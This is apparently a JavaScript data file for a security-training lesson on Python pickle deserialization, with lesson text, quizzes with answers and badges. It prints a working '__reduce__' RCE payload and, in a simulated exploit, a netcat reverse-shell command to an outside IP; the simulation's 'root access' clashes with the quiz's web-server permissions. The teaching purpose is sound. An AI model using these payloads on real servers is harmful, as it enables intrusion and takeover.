export const PICKLE_ROOM_DATA = {
  id: "python-pickle-deserialization",
  title: "Python Pickle Exploitation",
  category: "Advanced",
  difficulty: "Advanced",
  duration: "70 min",
  description: "Learn how insecure deserialization using Python Pickle can be weaponized into a Remote Code Execution (RCE) attack, bypassing security controls by manipulating object reconstruction.",
  totalXP: 250,
  enrollments: 950,
  rating: 4.9,
  creator: "CyberVerse Team",
  tags: ["pickle", "deserialization", "python", "rce", "security"],
  tasks: [
    {
      id: 1,
      title: "Introduction to Serialization",
      subtitle: "Objects to Bytes",
      icon: "package",
      difficulty: "Beginner",
      xp: 50,
      image: "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&q=80&w=800",
      scenario: {
        title: "State Persistence",
        text: "In many applications, you need to save the state of an object (like a user profile) to a file or database. Python's Pickle module makes this trivial—but this simplicity hides a dark secret.",
        impact: "Picking is inherently unsafe because it doesn't just store data; it stores the instructions on how to rebuild the object."
      },
      content: [
        { type: "text", value: "**Serialization** is the process of converting an object in memory into a byte stream that can be stored or transmitted. **Deserialization** is the reverse." },
        { type: "heading", value: "How Pickle Works" },
        { type: "text", value: "Pickle is a stack-based virtual machine. When you 'pickle' an object, Python generates a set of opcodes that another Python environment can execute to recreate that exact object." },
        { type: "terminal", language: "python", code: `import pickle\n\n# A simple dictionary object\nuser_data = {"id": 101, "role": "admin"}\n\n# Serialize to bytes\nserialized = pickle.dumps(user_data)\nprint(serialized) # b'\\x80\\x04\\x95\\x1b\\x00\\x00...` }
      ],
      questions: [
        {
          id: "pickle_q1",
          text: "What is the term for converting a byte stream back into a Python object?",
          answer: "Deserialization",
          acceptableAnswers: ["Deserialization", "deserializing"],
          hint: "The opposite of serialization."
        }
      ]
    },
    {
      id: 2,
      title: "The Deserialization Sink",
      subtitle: "The Danger of loads()",
      icon: "alert-triangle",
      difficulty: "Intermediate",
      xp: 50,
      image: "https://images.unsplash.com/photo-1544197150-b99a580bb7a8?auto=format&fit=crop&q=80&w=800",
      scenario: {
        title: "Trusting the Untrusted",
        text: "You find a web application that stores session data in a cookie. The cookie is just a Base64-encoded pickle string. Because the server uses 'pickle.loads()' on this cookie, you control what the server executes.",
        impact: "If you can control the input to 'loads()', you can force the server to execute arbitrary instructions during object reconstruction."
      },
      content: [
        { type: "text", value: "The primary vulnerability occurs when `pickle.loads()` is used on data provided by a user (from a cookie, API request, or uploaded file)." },
        { type: "callout", variant: "warning", title: "Official Warning", text: "The official Python documentation states: 'The pickle module is not secure. Only unpickle data you trust.'" },
        { type: "heading", value: "Exploitation Concept" },
        { type: "text", value: "When `pickle.loads()` encounters a class, it attempts to import the module and reconstruct the object. By defining a custom `__reduce__` method, an attacker can hijack this process." }
      ],
      questions: [
        {
          id: "pickle_q2",
          text: "True or False: Pickle is a safe format for storing sensitive session data in cookies.",
          answer: "False",
          acceptableAnswers: ["False", "false", "F"],
          hint: "It can execute code during reconstruction."
        }
      ]
    },
    {
      id: 3,
      title: "Weaponizing __reduce__",
      subtitle: "The Magic Exploit Method",
      icon: "code",
      difficulty: "Advanced",
      xp: 50,
      image: "https://images.unsplash.com/photo-1555066931-4365d14bab8c?auto=format&fit=crop&q=80&w=800",
      scenario: {
        title: "Crafting the Payload",
        text: "To achieve Remote Code Execution (RCE), we need the server to run a system command like 'whoami' or a reverse shell. We achieve this by defining an exploit class that returns a callable and arguments.",
        impact: "The '__reduce__' method tells the unpickling engine: 'To rebuild me, run this function with these arguments'."
      },
      content: [
        { type: "text", value: "The `__reduce__` method must return either a string or a tuple. If it returns a tuple, the first element is a **callable** object, and the second is a **tuple of arguments** for that callable." },
        { type: "terminal", language: "python", code: `import os\nimport pickle\n\nclass RCE_Payload:\n    def __reduce__(self):\n        # Execute 'ls /' on the server\n        return (os.system, ('ls /',))\n\npayload = pickle.dumps(RCE_Payload())\n# This 'payload' can now be sent to a vulnerable server.` },
        { type: "callout", variant: "tip", title: "Reverse Shells", text: "In a real attack, we would use 'os.system' or 'subprocess.run' to execute a netcat listener or a python-based reverse shell." }
      ],
      questions: [
        {
          id: "pickle_q3",
          text: "Which magic method is hijacked to trigger code execution during unpickling?",
          answer: "__reduce__",
          acceptableAnswers: ["__reduce__", "__reduce__ method", "reduce"],
          hint: "It returns a tuple of (callable, args)."
        }
      ]
    },
    {
      id: 4,
      title: "Remote Code Execution (RCE)",
      subtitle: "Total System Takeover",
      icon: "terminal",
      difficulty: "Advanced",
      xp: 50,
      image: "https://images.unsplash.com/photo-1558494949-ef010cbdcc51?auto=format&fit=crop&q=80&w=800",
      scenario: {
        title: "Gaining the Shell",
        text: "You send your base64-encoded pickle payload to the server's session cookie. The server deserializes the object, triggers the __reduce__ method, and executes your command as the web server user.",
        impact: "Once you have RCE, you can dump the database, pivot to the internal network, or install a persistent backdoor."
      },
      content: [
        { type: "text", value: "RCE is the ultimate goal of most attackers. In the context of deserialization, the code runs with the permissions of the application process." },
        { type: "exploitSim", steps: [
          { label: "Capture Cookie", code: "session=gASVHAAAAAAAAACMBG9zhpSMCnN5c3RlbZSTlIwId2hvYW1plFKULg==", status: "normal" },
          { label: "Injected Payload", code: "os.system('nc -e /bin/bash 10.10.0.1 4444')", status: "attack" },
          { label: "Server Execution", code: "Executing pickle instructions... root access granted", status: "exploit" },
          { label: "Result", code: "Reverse shell established ✓", status: "success" }
        ] }
      ],
      questions: [
        {
          id: "pickle_q4",
          text: "What does RCE stand for?",
          answer: "Remote Code Execution",
          acceptableAnswers: ["Remote Code Execution"],
          hint: "Running commands on a distant server."
        }
      ]
    },
    {
      id: 5,
      title: "Hardening and Mitigation",
      subtitle: "Beyond the Pickle",
      icon: "shield-check",
      difficulty: "Intermediate",
      xp: 50,
      image: "https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&q=80&w=800",
      scenario: {
        title: "Secure Serialization",
        text: "Pickle is fundamentally broken for untrusted data. To secure the application, we must switch to a data-only format that cannot execute instructions.",
        impact: "Switching to JSON or Protocol Buffers eliminates 100% of deserialization RCE risks."
      },
      content: [
        { type: "text", value: "If you MUST use Pickle, you should sign the data using **HMAC** to ensure it hasn't been tampered with before loading it. However, the best practice is to replace it." },
        { type: "heading", value: "The Safe Path: JSON" },
        { type: "comparison", 
          left: { title: "❌ Pickle", color: "#EF4444", items: ["Executes Code", "Python Specific", "Binary Format", "Unsafe Defaults"] }, 
          right: { title: "✅ JSON", color: "#39FF14", items: ["Data Only (Safe)", "Cross-Language", "Plain Text", "Industry Standard"] } 
        },
        { type: "codeComparison", 
          vulnerable: { label: "Vulnerable Py", language: "python", code: "data = pickle.loads(user_input)" }, 
          secure: { label: "Secure Py", language: "python", code: "import json\ndata = json.loads(user_input)" } 
        }
      ],
      questions: [
        {
          id: "pickle_q5",
          text: "Which lightweight, text-based data format is a safer alternative to Pickle?",
          answer: "JSON",
          acceptableAnswers: ["JSON", "json"],
          hint: "JavaScript Object Notation."
        }
      ]
    }
  ]
};

export const PICKLE_BADGES = [
  { id: "serializer", icon: "📦", name: "Data Serializer", desc: "Understand pickle basics" },
  { id: "exploit-builder", icon: "💣", name: "Exploit Builder", desc: "Create malicious payload" },
  { id: "rce-master", icon: "🔥", name: "RCE Master", desc: "Execute remote code" },
  { id: "defender", icon: "🛡️", name: "Secure Developer", desc: "Prevent attacks" },
  { id: "pickle-master", icon: "🐍", name: "Pickle Master", desc: "Complete all tasks" }
];

export const PICKLE_QUIZ = [
  {
    id: "pickle_fq1",
    question: "Why is Python's Pickle module considered dangerous?",
    options: ["It compresses data too much", "It can execute arbitrary code during unpickling", "It only works on Windows", "It leaks memory"],
    correctAnswer: "It can execute arbitrary code during unpickling",
    explanation: "Pickle is a stack-based machine that can be instructed to run any callable during object reconstruction."
  },
  {
    id: "pickle_fq2",
    question: "Which magic method can be defined in a class to control how it is unpickled?",
    options: ["__init__", "__str__", "__reduce__", "__call__"],
    correctAnswer: "__reduce__",
    explanation: "The __reduce__ method returns a tuple that the pickle engine uses to reconstruct the object, allowing for command injection."
  },
  {
    id: "pickle_fq3",
    question: "What is the primary function used to deserialize a byte stream in Pickle?",
    options: ["pickle.dumps()", "pickle.loads()", "pickle.read()", "pickle.exec()"],
    correctAnswer: "pickle.loads()",
    explanation: "loads() takes a bytes object and turns it back into a Python object."
  },
  {
    id: "pickle_fq4",
    question: "Which of the following is the BEST way to prevent deserialization vulnerabilities?",
    options: ["Using a complex password", "Using HMAC signing (if you must use pickle)", "Switching to JSON for untrusted data", "Enabling a Firewall"],
    correctAnswer: "Switching to JSON for untrusted data",
    explanation: "JSON is a data-only format that does not support code execution, making it inherently safe against deserialization RCE."
  },
  {
    id: "pickle_fq5",
    question: "If a pickle-based exploit runs on a server, what permissions will it have?",
    options: ["Root/Administrator", "Guest", "The same as the web server process", "No permissions at all"],
    correctAnswer: "The same as the web server process",
    explanation: "The injected code executes within the context of the running Python application."
  }
];
